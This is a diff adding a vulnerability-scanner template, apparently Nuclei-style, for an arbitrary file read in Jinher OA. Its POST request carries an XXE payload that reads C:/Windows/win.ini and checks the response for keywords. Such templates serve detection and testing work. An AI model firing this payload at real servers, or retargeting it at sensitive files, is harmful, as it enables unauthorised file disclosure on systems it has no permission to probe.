@@ -1,0 +1,37 @@
+id: poc-yaml-jinher-oa-geturl-anyfile-read
+info:
+  name: Jinher OA GetUrl Arbitrary File Read Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/jc6/servlet/PathFile?GetUrl"
+    headers:
+      Content-Type: application/xml
+    body: |-
+      <?xml version="1.0" encoding="UTF-8"?>
+      <!DOCTYPE root [
+        <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">
+      ]>
+      <root>
+        <path>&xxe;</path>
+        <strType>file</strType>
+        <IsVi>no</IsVi>
+        <displayType>list</displayType>
+        <strFiles>*.*</strFiles>
+      </root>
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "路径:"
+          - "[files]"
+          - "bit app support"
+          - "不存在"
+          - "<!DOCTYPE"
+        condition: and
